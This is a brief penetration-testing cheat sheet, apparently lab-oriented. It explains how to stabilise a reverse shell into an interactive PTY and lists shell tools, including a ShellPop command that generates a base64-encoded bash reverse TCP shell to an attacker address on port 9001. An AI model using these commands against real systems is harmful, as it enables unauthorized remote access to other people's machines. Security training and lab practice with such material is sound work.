# Shells




## Upgrade to PTY

* [https://forum.hackthebox.eu/discussion/comment/22312#Comment_22312](https://forum.hackthebox.eu/discussion/comment/22312#Comment_22312)
* [https://xakep.ru/2019/07/16/mischief/#toc05.1](https://xakep.ru/2019/07/16/mischief/#toc05.1)
* [https://securixy.kz/hack-faq/apgrejd-reverse-shell-do-interaktivnogo-tty.html/](https://securixy.kz/hack-faq/apgrejd-reverse-shell-do-interaktivnogo-tty.html/)

```
$ python -c 'import pty; pty.spawn("/bin/bash")'
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
Or
$ script -q /dev/null sh

user@remote:~$ ^Z
(background)

root@kali:~$ stty -a | head -n1 | cut -d ';' -f 2-3 | cut -b2- | sed 's/; /\n/'
(get ROWS and COLS)

root@kali:~$ stty raw -echo; fg

(opt) user@remote:~$ reset

user@remote:~$ stty rows ${ROWS} cols ${COLS}

user@remote:~$ export TERM=xterm
(or xterm-color or xterm-256color)

(opt) user@remote:~$ exec /bin/bash [-l]
```




## Tools

* [http://www.jackson-t.ca/runtime-exec-payloads.html](http://www.jackson-t.ca/runtime-exec-payloads.html)


### ShellPop

* [https://github.com/0x00-0x00/ShellPop](https://github.com/0x00-0x00/ShellPop)

Bash reverse TCP:

```
$ shellpop -H 10.10.13.37 -P 9001 --reverse --number 8 --base64
```



### pwncat

* [https://securixy.kz/hack-faq/pwncat-netcat-na-steroidah.html/](https://securixy.kz/hack-faq/pwncat-netcat-na-steroidah.html/)
* [https://github.com/cytopia/pwncat](https://github.com/cytopia/pwncat)
